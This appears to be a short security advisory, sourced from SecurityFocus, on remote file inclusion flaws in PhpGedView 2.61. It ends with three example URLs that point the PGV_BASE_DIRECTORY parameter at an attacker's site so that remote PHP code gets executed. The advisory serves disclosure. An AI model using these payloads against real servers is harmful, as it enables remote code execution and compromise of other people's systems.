@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/9368/info
+
+PhpGedView is prone to multiple file include vulnerabilities. The source of the issue is that a number of scripts that ship with the software permit remote users to influence require() paths for various external files. This will permit remote attackers to cause malicious PHP scripts from attacker-controlled servers to be included and subsequently executed in the context of the web server hosting the vulnerable software.
+
+These issues are reported to affect PhpGedView 2.61. Other versions are also likely affected.
+
+http://www.example.com/phpgedview_folder/authentication_index.php?PGV_BASE_DIRECTORY=http://[attacker's_site]
+http://www.example.com/phpgedview_folder/functions.php?PGV_BASE_DIRECTORY=http://[attacker's_site]
+http://www.example.com/phpgedview_folder/config_gedcom.php?PGV_BASE_DIRECTORY=http://[attacker's_site]
